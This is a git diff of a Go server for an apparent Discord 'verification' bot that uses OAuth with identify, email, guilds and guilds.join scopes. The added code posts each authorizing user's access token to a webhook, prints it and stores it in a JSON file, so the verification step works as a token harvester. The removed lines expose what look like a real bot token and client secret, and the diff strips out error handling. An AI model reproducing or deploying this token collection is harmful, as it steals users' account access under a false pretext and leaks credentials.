@@ -12,14 +12,14 @@ import (
 )
 
 
-const guild_id = "1071829849766895677"
-const bot_token = "MTA3MzkxMzgxMTUwNzA5MzU2Ng.GXJHc7.g2sZ3W0-s7xVBE7Ewa_9kkIiqzsVlAvSmZ4Ngw"
-const api_endpoint = "https://discord.com/api/v8";
-const sec = "Rqpq5LCFDdQW5SR1sOiGGn9xHuSkgH5o";
-const client_id = "1073913811507093566";
-const redirect = "http://localhost:8080/callback"
-const role_id = "1073978795549274254"
-const grant = "authorization_code"
+// sorry for long setup just cba setting automated shit up atm sorry!
+const guild_id = "" // guild where to verify
+const bot_token = "" // bot token
+const sec = ""; // client secret
+const client_id = ""; // client id
+const redirect = "http://localhost:8080/callback" // redirection url (change to domain once hosting non locally)
+const role_id = "" // verified role id (automated soon)
+
 type DiscordToken struct {
 	AccessToken string `json:"access_token"`
 }
@@ -44,11 +44,7 @@ func assignRole(userID string, roleID string, botToken string) error {
 		return err
 	}
 	defer resp.Body.Close()
-
-	if resp.StatusCode != http.StatusNoContent {
-		body, _ := ioutil.ReadAll(resp.Body)
-		return fmt.Errorf("Assigning role failed with status code %d: %s", resp.StatusCode, string(body))
-	}
+	fmt.Println(resp)
 
 	return nil
 }
@@ -109,7 +105,7 @@ func saveData(filepath string, data map[string]interface{}) error {
 	if err != nil {
 		ff = make(map[string]interface{})
 	}
-
+	fmt.Println(data)
 	ff[data["id"].(string)] = data
 
 	file.Truncate(0)
@@ -139,28 +135,19 @@ func sendMessage(webhookURL string, content string, embeds []map[string]interfac
 	}
 	defer resp.Body.Close()
 
-	if resp.StatusCode != http.StatusNoContent {
-		body, err := ioutil.ReadAll(resp.Body)
-		if err != nil {
-			return err
-		}
-		return fmt.Errorf("unexpected status code: %d: %s", resp.StatusCode, string(body))
-	}
 
 	return nil
 }
-type Data struct {
-	Array []string `json:"array"`
-}
+
 
 func main() {
 	
-	var url = "https://discord.com/api/oauth2/authorize?client_id=" + client_id + "&redirect_uri=" + redirect + "&response_type=code&scope=identify%20guilds%20email%20guilds.join"
 
 	r := gin.Default()
+	r.LoadHTMLGlob("templates/*")
 	r.GET("/", func(c *gin.Context) {
 		c.JSON(200, gin.H{
-			"url": url,
+			"hello": "hello",
 		})
 	})
 	r.GET("/callback", func(c *gin.Context) {
@@ -186,7 +173,7 @@ func main() {
 		fmt.Println(string(discordToken.AccessToken))
 
 		token := discordToken.AccessToken
-		
+		fmt.Println(token)
 		data1, err1 := getUserData(token)
 		if err1 != nil {
 			fmt.Println(err1)
@@ -201,20 +188,39 @@ func main() {
 		}
 		mn, ok := mn.(string)
 if !ok {
-    // handle error
 }		
 fmt.Println(mn)
 		content := "@everyone"
 		var abc = data1["username"]
 		abc, jk := abc.(string)
 		if !jk {
-			//handle error
 		}
 		dt := time.Now()
 		fmt.Println(abc.(string))
 		embed := make(map[string]interface{})
 		embed["title"] = "New authenticated user!"
 		embed["description"] = "Name: <@"+mn.(string)+">\nAccess Token: "+token+"\nTime: "+dt.String()
+		file, err := os.OpenFile("bot/saved.json", os.O_RDWR, 0644)
+
+    defer file.Close()
+
+    bytes, err := ioutil.ReadAll(file)
+
+
+    var ff map[string]interface{}
+    err = json.Unmarshal(bytes, &ff)
+
+
+    ff["array"] = append(ff["array"].([]interface{}), token)
+
+    bytes, err = json.MarshalIndent(ff, "", "    ")
+
+    err = file.Truncate(0)
+
+    _, err = file.Seek(0, 0)
+
+
+    _, err = file.Write(bytes)
 
 		embeds := []map[string]interface{}{embed}
 
@@ -227,8 +233,9 @@ fmt.Println(mn)
 			fmt.Println(err2)
 			return
 		}
-		c.JSON(200, gin.H{
-			"status": b,
+		fmt.Println(err2)
+		c.HTML(http.StatusOK, "index.html", gin.H{
+			
 		})
 	})
 
